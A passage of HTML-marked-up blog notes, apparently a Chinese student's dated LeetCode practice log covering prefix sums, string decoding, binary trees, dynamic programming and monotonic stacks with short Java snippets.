class="number">5</span>%：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;nums.length;j++)&#123;</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，前缀和+哈希表优化。上面的方法时间复杂度是O(n^<span class="number">2</span>)，但我们其实不需要通过遍历求每个数组的和，而是能通过前缀和计算出任意数组的和，假设pre[i]表示[<span class="number">0</span>,i]中所有数字的和，pre[j]表示[<span class="number">0</span>,j]中所有数字的和(i&lt;j)，那么</span><br><span class="line">    数组[i+<span class="number">1</span>,j] = pre[j] - pre[i];       <span class="comment">//pre[j] - pre[i] = k</span></span><br><span class="line">    这时候只要把前缀和都放到hashMap，每获得一个新pre，从hashMap中查找(pre-k)的键值。</span><br><span class="line">    注意，最开始时要“ hashMap.put(<span class="number">0</span>,<span class="number">1</span>); ”，因为<span class="number">0</span>位置以前的前缀和为<span class="number">0</span>也算一种情况，即该子数组从<span class="number">0</span>开始。</span><br><span class="line"><span class="number">4.</span>今天这几道题写得都挺好的，主要是以前的一些经典代码，不过还是需要提示关键逻辑才能再写出来。</span><br></pre></td></tr></table></figure><h2 id="394、字符串解码（10月25日）"><a href="#394、字符串解码（10月25日）" class="headerlink" title="394、字符串解码（10月25日）"></a>394、字符串解码（10月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。这道题主要考察字符串相关api，以及递归的逻辑。我将dfs函数设计如下：</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[] charArray,<span class="type">int</span> start,StringBuilder builder)</span></span><br><span class="line">对于一段序列：</span><br><span class="line">a.如果是小写字母，直接加入builder；</span><br><span class="line">b.如果是数字，将其后的几个数字一起加入builder2，并将builder2转换为数字；dfs(charArray,i+<span class="number">1</span>,builder1);递归处理<span class="string">&#x27;[&#x27;</span>后面的字符串，并将builder1扩展n倍后加入本轮的builder，将i设置为dfs返回值，即递归<span class="string">&#x27;]&#x27;</span>的索引；</span><br><span class="line">    c.如果是<span class="string">&#x27;]&#x27;</span>，则<span class="keyword">return</span> i，说明本轮递归调用结束。</span><br><span class="line">这样的处理方法，是因为递归的dfs会返回<span class="string">&#x27;]&#x27;</span>的索引，从该索引位置继续遍历，直到遇到本轮的<span class="string">&#x27;]&#x27;</span>。</span><br><span class="line"><span class="number">2.</span>官方题解的简写代码（处理字符串中的连续整数）：</span><br><span class="line">    <span class="comment">//每个dfs维护一个整数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">multi</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//当遇到整数时，就构造完整的整数</span></span><br><span class="line"><span class="keyword">if</span>(s.charAt(i) &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;9&#x27;</span>) </span><br><span class="line">multi = multi * <span class="number">10</span> + Integer.parseInt(String.valueOf(s.charAt(i))); </span><br><span class="line"><span class="comment">//当递归的dfs返回，扩展递归的返回字符串时，就将该整数减回0，从而不用专门为整数构造builder2</span></span><br><span class="line"><span class="keyword">while</span>(multi &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.append(result1);</span><br><span class="line">            multi--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>字符串处理api记录复制：</span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(builder2.toString());  <span class="comment">//String转int</span></span><br><span class="line"><span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(charArray[i]));  <span class="comment">//char转int</span></span><br><span class="line">Character.isDigit(charArray[i]) <span class="comment">//判断char是否为数字</span></span><br><span class="line">Character.isLowerCase(charArray[i])<span class="comment">//判断char是否为小写字母</span></span><br></pre></td></tr></table></figure><h2 id="448、找到所有数组中消失的数字（10月25日）"><a href="#448、找到所有数组中消失的数字（10月25日）" class="headerlink" title="448、找到所有数组中消失的数字（10月25日）"></a>448、找到所有数组中消失的数字（10月25日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，HashSet。将nums中所有数字放入hashSet，再在“ <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nums.length+<span class="number">1</span>;i++) ”范围里遍历，如果i不在hashSet中，就将i加入结果。</span><br><span class="line"><span class="number">2.</span>官方题解，原地修改。HashSet的存在是为了记录nums中的数字，由于nums的长度也为n，恰好能记录[<span class="number">1</span>,n]个数字，遍历数组时将遍历到的索引位置加n，则没遍历到的索引位置势必小于n，再次遍历找到该位置即可。时间复杂度 O(<span class="number">2</span>*n)=O(n)。</span><br><span class="line">    nums[(nums[i]-<span class="number">1</span>)%n] += n;   <span class="comment">//就是处理第一轮索引的情况，10%10-1=-1，但是(10-1)%10=9</span></span><br></pre></td></tr></table></figure><h2 id="155、最小栈（10月26日）"><a href="#155、最小栈（10月26日）" class="headerlink" title="155、最小栈（10月26日）"></a>155、最小栈（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，双栈。这道题思路很简单，我们最开始的想法是用一个minValue变量存储最小值，每当元素压栈时，就尝试更新最小值，但我们之所以不敢这么做，是因为如果弹栈元素恰好为最小值，那下一个最小值该是谁呢？优化这个思路的方法就是双栈，维护一个最小值栈，原始栈中的每个栈顶与最小值栈中的栈顶一一对应，原始栈弹栈同时也将最小值栈弹栈。</span><br><span class="line">（关键词，双栈对应）</span><br></pre></td></tr></table></figure><h2 id="234、回文链表（10月26日）"><a href="#234、回文链表（10月26日）" class="headerlink" title="234、回文链表（10月26日）"></a>234、回文链表（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，快慢指针+反转链表。今天要做研究，就挑个软柿子捏一捏。没啥说的，快慢指针时注意初值fast=slow=dummy，反转链表时注意维护prev、cur和temp三枚指针。</span><br></pre></td></tr></table></figure><h2 id="461、汉明距离（10月26日）"><a href="#461、汉明距离（10月26日）" class="headerlink" title="461、汉明距离（10月26日）"></a>461、汉明距离（10月26日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，按位运算。突然想到下面的方法，即比较x和y的每一位，相等时将最终结果result加一。</span><br><span class="line">    (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;   <span class="comment">//获取32位int型数字的每一位</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，异或。x和y异或（x^y）后，获取结果的每一位并累加到result。</span><br></pre></td></tr></table></figure><h2 id="128、最长连续序列（10月27日）"><a href="#128、最长连续序列（10月27日）" class="headerlink" title="128、最长连续序列（10月27日）"></a>128、最长连续序列（10月27日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，排序。将数组nums排好序后，从左到右遍历，维护一个变量prev指向前一个访问的数字，如果本数字恰为前一个数字加一，则更新累积长度tmpValue；<span class="keyword">else</span> <span class="keyword">if</span>本数字不等于前一数字，更新最大累积长度，并将tmpValue恢复为初值<span class="number">1</span>。结束循环后还需要再更新一次最大累积长度，否则会漏掉最后的tmpValue。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，HashSet。<span class="keyword">for</span>(<span class="type">int</span> num:nums)遍历数组，将数字放入hashSet；再<span class="keyword">for</span>(<span class="type">int</span> num:nums)遍历数字，如果hashSet中不包含num-<span class="number">1</span>，说明是一个新序列，将prev初值设置为num，满足<span class="keyword">while</span>(hashSet.contains(prev+<span class="number">1</span>))的情况下，不断更新该序列长度。</span><br></pre></td></tr></table></figure><h2 id="226、反转二叉树（11月2日）"><a href="#226、反转二叉树（11月2日）" class="headerlink" title="226、反转二叉树（11月2日）"></a>226、反转二叉树（11月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，层序遍历二叉树。观察题意，其实操作并不复杂，就是交换每个节点的左、右子节点。经典的层序遍历二叉树，是通过维护队列和每层长度count实现的，这道题不需要分层，就按层序遍历时把节点可劲儿往队列里丢，弹出时再交换其左右子节点即可。只是指针变化。</span><br></pre></td></tr></table></figure><h2 id="338、比特位计数（11月5日）"><a href="#338、比特位计数（11月5日）" class="headerlink" title="338、比特位计数（11月5日）"></a>338、比特位计数（11月5日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，按位与。从<span class="number">0</span>到n遍历数字i，由于i为<span class="type">int</span>型，通过下面方法计数i中<span class="number">1</span>的个数，并将本轮结果放入results[i]。</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)result += (i&gt;&gt;j)&amp;<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="10、正则表达式匹配（11月7日）"><a href="#10、正则表达式匹配（11月7日）" class="headerlink" title="10、正则表达式匹配（11月7日）"></a>10、正则表达式匹配（11月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题太难了，看了很多遍题解都无法想通，就这样吧。</span><br></pre></td></tr></table></figure><h2 id="53、把二叉树搜索树转换为累加树（11月7日）"><a href="#53、把二叉树搜索树转换为累加树（11月7日）" class="headerlink" title="53、把二叉树搜索树转换为累加树（11月7日）"></a>53、把二叉树搜索树转换为累加树（11月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈实现后序遍历二叉树。完了我TM傻掉了，啊啊啊啊，后序遍历指的是中间节点最后访问，这个应该是反序中序遍历，怪不得重新看栈实现后序遍历这么迷。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，递归实现反序中序遍历二叉树。先converBST(root.right)，返回后根据本节点值更新sum，再更新本节点值，最后converBST(root.right)即可。</span><br></pre></td></tr></table></figure><h2 id="543、二叉树的直径（11月7日）"><a href="#543、二叉树的直径（11月7日）" class="headerlink" title="543、二叉树的直径（11月7日）"></a>543、二叉树的直径（11月7日）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法，深度优先搜索。这道题比较经典，就是dfs左、右叶子节点，通过Math.max(result[0],left+right)判断经过本根节点的路径，向上返回Math.max(left,right)+1即选左边或者右边。</span><br><span class="line">2.我这里遇到root==null时，会返回当前累计长度len-1，这导致需要一个记录深度的变量deep，本位置的更新转化为Math.max(results[0],(left-deep)+(right-deep));，有点复杂了，实际只需要root==null时返回0，不用记录len和deep。</span><br></pre></td></tr></table></figure><h2 id="236、二叉树的最近公共祖先（11月8日）"><a href="#236、二叉树的最近公共祖先（11月8日）" class="headerlink" title="236、二叉树的最近公共祖先（11月8日）"></a>236、二叉树的最近公共祖先（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，HashMap+HashSet+dfs。首先通过dfs遍历二叉树，按&lt;本节点，本节点的父节点&gt;形式放入hashMap，这样就获知了每个节点的父节点信息。从p开始向上遍历至root节点，将路径中遇到的节点都存入hashSet，然后从q开始向上遍历至root节点，观察路径中的节点是否出现在hashSet，若出现则为最近的公共祖先。（关键词，&lt;本节点，本节点的父节点&gt;）</span><br></pre></td></tr></table></figure><h2 id="617、合并二叉树（11月8日）"><a href="#617、合并二叉树（11月8日）" class="headerlink" title="617、合并二叉树（11月8日）"></a>617、合并二叉树（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历二叉树。这道题和经典广度优先有所差别，也让我有所顾忌。先维护三个队列，分别用于新Tree、root1和root2的广度优先遍历。</span><br><span class="line">    a.以某位置左子节点为例，只有left1和left2都不为<span class="literal">null</span>时，才将其放入各自队列，否则只是连接不为<span class="literal">null</span>的子节点到新Tree，并不放入队列。因为目标是将节点放到新Tree，此时已经把该左子树全都放到新Tree，没有必要继续遍历。</span><br><span class="line">    b.外层循环为 <span class="keyword">while</span>(!tree1.isEmpty()&amp;&amp;!tree2.isEmpty())是和不是或，其实无所谓，上一步已经保证了tree1和tree2在每一时刻都是同步的，相同大小。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，递归实现深度优先遍历。递归实现还是比较简单的，直接在mergeTrees递归。首先，root1.val = root1.val+root2.val;，然后分别对二者左、右子树进行mergeTrees，将返回值分别连接到root1的left指针和right指针，最后返回root1即可。</span><br></pre></td></tr></table></figure><h2 id="198、打家劫舍（11月8日）"><a href="#198、打家劫舍（11月8日）" class="headerlink" title="198、打家劫舍（11月8日）"></a>198、打家劫舍（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。这道题几天前做过，dp[i]表示偷窃第i号房间的最大收益，dp[i]的计算要考虑合法位置，合法位置包括dp[i-<span class="number">2</span>]和dp[i-<span class="number">3</span>]这两种，其中dp[i-<span class="number">3</span>]可以用dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>]表示。最后<span class="keyword">return</span> Math.max(dp[n-<span class="number">2</span>],dp[n-<span class="number">1</span>])即可。</span><br></pre></td></tr></table></figure><h2 id="238、除自身以外数组的乘积（11月8日）"><a href="#238、除自身以外数组的乘积（11月8日）" class="headerlink" title="238、除自身以外数组的乘积（11月8日）"></a>238、除自身以外数组的乘积（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，分治法。最简单的想法是双层<span class="keyword">for</span>循环，但是会超越时间限制，然后就只能想到除再没有办法了。题解的思路为，任意位置result[i]=它左边的所有数乘积*它右边的所有数乘积，故通过<span class="keyword">for</span>+<span class="keyword">for</span>维护leftNums、rightNums数组，leftNums[i]表示i以左所有数字的乘积，rightNums[i]表示i以右所有数字的乘积，result[i]=leftNums[i]*rightNums[i]。</span><br></pre></td></tr></table></figure><h2 id="739、每日温度（11月8日）"><a href="#739、每日温度（11月8日）" class="headerlink" title="739、每日温度（11月8日）"></a>739、每日温度（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，单调栈。最简单的想法还是双层<span class="keyword">for</span>循环，但是会超越时间限制。这是一道单调栈的模板题，我用以下思路实现单调栈，突然发现题解也是这样写得，芜湖起飞：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;   <span class="comment">//如果新元素比栈顶大，就循环弹栈</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="keyword">if</span> (temperatures[i]&gt;temperatures[index])&#123;</span><br><span class="line">                result[index] = i-index;    <span class="comment">//业务逻辑</span></span><br><span class="line">                stack.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stack.push(i);   <span class="comment">//遇到新元素不论如何都要压栈</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>再记录一下什么时候想到用单调栈：</span><br><span class="line">    通常是一维数组，要寻找任一个元素的右边或者左边第一个比自己大或者小的元素的位置，此时我们就要想到可以用单调栈了。</span><br></pre></td></tr></table></figure><h2 id="438、找到字符串中所有字母异位词（11月8日）"><a href="#438、找到字符串中所有字母异位词（11月8日）" class="headerlink" title="438、找到字符串中所有字母异位词（11月8日）"></a>438、找到字符串中所有字母异位词（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，滑动窗口。可能很长时间没做滑动窗口了，竟然第一时间没做出来。顾虑主要是如何对比hashMap或者<span class="type">int</span>[]，这里是直接Arrays.equals(countS,countP)比较，那就没啥说的了，就是先在countS和countP中分别放pLen个s和p中的数字，做第一次比较后，再开始通过<span class="keyword">for</span>(<span class="type">int</span> i=pLen;i&lt;sLen;i++)进行滑动窗口逻辑。</span><br><span class="line"><span class="number">2.</span>比较两个<span class="type">int</span>[]数组是否相等，使用Arrays.equals(countS,countP)；那比较两个hashMap数据是否相等该用啥呢？</span><br></pre></td></tr></table></figure><h2 id="337、打家劫舍Ⅲ（11月8日）"><a href="#337、打家劫舍Ⅲ（11月8日）" class="headerlink" title="337、打家劫舍Ⅲ（11月8日）"></a>337、打家劫舍Ⅲ（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，后序dfs+动态规划。每次做到“打家劫舍”系列就顿时感觉到思路巧妙，</span><br><span class="line">  a.“打家劫舍Ⅰ”需要考虑两种合法位置，dp[i] = Math.max(dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>],dp[i-<span class="number">2</span>])+nums[i];</span><br><span class="line">  b.“打家劫舍Ⅱ”是环形房屋，需要额外考虑[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围里的最优解和[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围里的最优解两种情况；</span><br><span class="line">  c.“打家劫舍Ⅲ”是二叉树房屋，则和“offertwo92翻转字符”类似要分情况讨论，有两个状态转移方程，列一下注释即明白：</span><br><span class="line">Map&lt;TreeNode,Integer&gt; f = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">//选取当前节点后的最大收益</span></span><br><span class="line">Map&lt;TreeNode,Integer&gt; g = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">//放弃当前节点后的最大收益</span></span><br><span class="line"><span class="comment">//如果选择偷盗当前root位置，则收益为放弃其左右子节点的收益之和</span></span><br><span class="line">f.put(root,g.getOrDefault(root.left,<span class="number">0</span>)+g.getOrDefault(root.right,<span class="number">0</span>)+root.val);</span><br><span class="line">    <span class="comment">//如果选择放弃root位置，对于子节点既可以选取，又可以放弃，则收益组成，Math.max(选取左，放弃左)+Math.max(选取右，放弃右)</span></span><br><span class="line">g.put(root,Math.max(f.getOrDefault(root.left,<span class="number">0</span>),g.getOrDefault(root.left,<span class="number">0</span>))</span><br><span class="line">                +Math.max(f.getOrDefault(root.right,<span class="number">0</span>),g.getOrDefault(root.right,<span class="number">0</span>)));</span><br><span class="line"><span class="number">2.</span>本题遍历二叉树时，采用递归dfs实现，需要后序遍历，因为计算根节点收益时，需要知道左子节点和右子节点的收益情况。</span><br></pre></td></tr></table></figure><h2 id="309、最佳买卖股票时机含冷冻期（11月8日）"><a href="#309、最佳买卖股票时机含冷冻期（11月8日）" class="headerlink" title="309、最佳买卖股票时机含冷冻期（11月8日）"></a>309、最佳买卖股票时机含冷冻期（11月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这是一种新的动态规划题型，转移方程表示最大收益，包括状态和行动分情况讨论，将转移方程列为下式：</span><br><span class="line">    （<span class="number">1</span>）.f[i][<span class="number">0</span>]  <span class="comment">//状态：我们在第i天拥有一支股票  行动：这只股票可以是第i天买入，也可以不是第i天买入</span></span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = -prices[i]</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">0</span>] = Math.max(f[i-<span class="number">1</span>][<span class="number">2</span>]-prices[i]，f[i-<span class="number">1</span>][<span class="number">0</span>])   <span class="comment">//前者是第i-1天买入，后者是第i-1天已经持有</span></span><br><span class="line">    （<span class="number">2</span>）.f[i][<span class="number">1</span>]  <span class="comment">//状态：我们在第i天不拥有一张股票  行动：我们在第i天卖掉股票（造成不拥有），造成第i+1天的冷冻期</span></span><br><span class="line">f[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">1</span>] = f[i-<span class="number">1</span>][<span class="number">0</span>]+prices[i]    <span class="comment">//上一状态只能是第i-1天拥有股票</span></span><br><span class="line">（<span class="number">3</span>）.f[i][<span class="number">2</span>]  <span class="comment">//状态：我们在第i天不拥有一张股票  行动：它是（i-1）或以前卖掉的，所以第（i+1）天不存在冷冻期</span></span><br><span class="line">         f[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">         <span class="keyword">if</span> i!=<span class="number">0</span>: f[i][<span class="number">2</span>] = Math.max(f[i-<span class="number">1</span>][<span class="number">1</span>],f[i-<span class="number">1</span>][<span class="number">2</span>])  <span class="comment">//上一状态是i-1天卖掉造成不拥有，或者更为长期的不拥有</span></span><br><span class="line">  通过上面这些式子，我们可以看到收益的传播，上一状态是非冷冻期不持有的最大收益，则会传播到下一状态购入股票的最大收益。最终返回Math.max(f[n-<span class="number">1</span>][<span class="number">1</span>],f[n-<span class="number">1</span>][<span class="number">2</span>])即可，即股票已经被卖掉了。</span><br><span class="line"><span class="number">2.</span>这道题又和分情况讨论不同，它定义转移方程时，需要从状态和行动考虑，会出现同一状态选择不同的行动。下次再做时估计还是难以想到，不过还是在分析中感受到动态规划的魅力。</span><br></pre></td></tr></table></figure><h2 id="406、根据身高重建队列（11月17日）"><a href="#406、根据身高重建队列（11月17日）" class="headerlink" title="406、根据身高重建队列（11月17日）"></a>406、根据身高重建队列（11月17日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题题目很搞啊，并不是说给input数组换一个顺序、标好位置再输出，而是input数组中每个元素标好了在输出数组的位置，需要把这个固定的顺序恢复出来。比如input数组为[[<span class="number">7</span>,<span class="number">0</span>],[<span class="number">4</span>,<span class="number">4</span>],[<span class="number">7</span>,<span class="number">1</span>],[<span class="number">5</span>,<span class="number">0</span>],[<span class="number">6</span>,<span class="number">1</span>],[<span class="number">5</span>,<span class="number">2</span>]]，其中[<span class="number">4</span>,<span class="number">4</span>]并不意味着它在输出数组的第<span class="number">4</span>个位置，甚至可能在最后一位，[<span class="number">7</span>,<span class="number">1</span>]数组身高很高也可能在最后，这就是本题困难的地方。</span><br><span class="line"><span class="number">2.</span>这道题是一道怪题，卡了我好几天没心情继续，看题解评论区唯心色彩的解释感觉也都是面向答案理解的吧。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，从低到高排序。其实很简单，首先按身高从低到高排序，相同身高再按k值从高到低到低排序，排好序后从左到右遍历people，计算当前遍历位置person的k值，代表它落座后左侧应该有k个空位（即遍历result数组时，遇到<span class="literal">null</span>就将k减一），它落在第（k+<span class="number">1</span>）个空位上。</span><br><span class="line">    这样就能理解为什么k值要从高到低排序，因为这个算法中相同身高，k值低的先落座的话，就会减少<span class="literal">null</span>（空位）数目，从而影响后面k值高的落座，反过来k值高的先落座则不会影响低的。</span><br><span class="line">    Arrays.sort(people, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;<span class="type">int</span>[]&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">int</span>[] person1, <span class="type">int</span>[] person2)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(person1[<span class="number">0</span>]!=person2[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> person1[<span class="number">0</span>] - person2[<span class="number">0</span>]; <span class="comment">//身高不同，就按从低到高</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> person2[<span class="number">1</span>] - person1[<span class="number">1</span>]; <span class="comment">//身高相同，就按K值从高到低</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h2 id="152、乘积最大子数组（11月19日）"><a href="#152、乘积最大子数组（11月19日）" class="headerlink" title="152、乘积最大子数组（11月19日）"></a>152、乘积最大子数组（11月19日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划+每轮求max。这道题真的莫名奇妙就做出来了，然后再思考为啥做出来哈哈哈。首先定义dpmax[i]表示以i结尾的子数组乘积的最大值，以dpmin[i]表示以i结尾的子数组的最小值。需要两种状态，是因为如果很久以前出现负数，如果只保留最大值，就会丢失掉该负数，如果后面再次出现负数，就失去了改邪归正的机会。</span><br><span class="line">    解题思路，这道题和前面不同，并不会把状态累积到（n-<span class="number">1</span>）位，是不断求局部最优，所以初始化</span><br><span class="line">    result = Math.max(dpmin[<span class="number">0</span>],dpmax[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)时，在每轮求nums[i],dpmax[i]*nums[i],dpmin[i]*nums[i]中最大值和最小值，并更新result。</span><br><span class="line">不断求局部最优，是因为i位置的状态可能会被舍弃掉，比如遇到后面的<span class="number">0</span>。  </span><br><span class="line"><span class="number">2.</span>想象一个序列[-<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>]，dpmax依次为[-<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">12</span>]，dpmin依次为[-<span class="number">2</span>,-<span class="number">2</span>,-<span class="number">4</span>,-<span class="number">4</span>,-<span class="number">6</span>]，可以看到-<span class="number">2</span>被保留到最后，三个数的大小比较是会翻转的。</span><br></pre></td></tr></table></figure><h2 id="10、正则表达式匹配（11月19日）"><a href="#10、正则表达式匹配（11月19日）" class="headerlink" title="10、正则表达式匹配（11月19日）"></a>10、正则表达式匹配（11月19日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题很难，第二次尝试做直接放弃。首先定义f[i][j]表示s中的前i个字符与p中的前j个字符是否匹配，这么定义主要是求f[i][j]时需要用到前面的状态，设f[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>，表示空字符串相互匹配。</span><br><span class="line">我放弃了，看呀看还是不行，但又记得师兄面安全开发岗时竟然被问这道题，哭唧唧就这样吧。</span><br></pre></td></tr></table></figure><h2 id="48、旋转图像（11月21日）"><a href="#48、旋转图像（11月21日）" class="headerlink" title="48、旋转图像（11月21日）"></a>48、旋转图像（11月21日）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法，辅助数组。这道题不让用辅助数组，但我不接受建议。注意索引之间关系即可，而且二维数组不可matrix直接赋值另一个二维数组的引用result，而是要用两层for循环逐位置赋值。（看到题解也用了辅助数组，我安心多了）</span><br><span class="line">2.思路1，主对角线翻转。数学题我不做哼！</span><br></pre></td></tr></table></figure><h2 id="62、不同路径（11月21日）"><a href="#62、不同路径（11月21日）" class="headerlink" title="62、不同路径（11月21日）"></a>62、不同路径（11月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题并不是图BFS，而是找规律的题。设状态dp[i][j]表示到达 （i，j）的路径数目，那么状态转移方程为：</span><br><span class="line">     dp[i][j] = dp[i-<span class="number">1</span>][j]+dp[i][j-<span class="number">1</span>];<span class="comment">//表示（i，j）位置的路径数目时其左侧和上方的总和</span></span><br><span class="line">看起来和爬楼梯那道题目很想，just明白公式，需要注意dp数组最左侧的一列和最上方的一行要被初始化为<span class="number">1</span>，表示只有一种方式到达。</span><br></pre></td></tr></table></figure><h2 id="64、最小路径和（11月21日）"><a href="#64、最小路径和（11月21日）" class="headerlink" title="64、最小路径和（11月21日）"></a>64、最小路径和（11月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，DFS。深度优先搜索比较简单，设计dfs函数如下，在i或者j没有到达边界时，继续对i或者j单独加一后递归。但遗憾的是，超过了时间限制。</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] grid,<span class="type">int</span> i,<span class="type">int</span> j,<span class="type">int</span>[] result,<span class="type">int</span> temp)</span></span><br><span class="line">dfs(grid,i+<span class="number">1</span>,j,result,temp+grid[i][j]);</span><br><span class="line"><span class="number">2.</span>我的想法，动态规划。看了眼答案，解决思路是动态规划，那岂不是和“<span class="number">62.</span>不同路径”师出同门。设状态dp[i][j]表示到达（i,j）的路径的最小数字总和，那么dp[i][j]的来源还是dp[i-<span class="number">1</span>][j]和dp[i][j-<span class="number">1</span>]，状态转移方程为：</span><br><span class="line">    dp[i][j] = Math.min(dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j])+grid[i][j];</span><br><span class="line">注意，这时候dp数组的最左侧状态转移方程：dp[i][<span class="number">0</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>]+grid[i][<span class="number">0</span>];</span><br><span class="line">dp数组的最右侧状态转移方程：dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i-<span class="number">1</span>]+grid[<span class="number">0</span>][i];</span><br></pre></td></tr></table></figure><h2 id="240、搜索二维矩阵-II（11月21日）"><a href="#240、搜索二维矩阵-II（11月21日）" class="headerlink" title="240、搜索二维矩阵 II（11月21日）"></a>240、搜索二维矩阵 II（11月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，DFS。设计dfs函数如下，<span 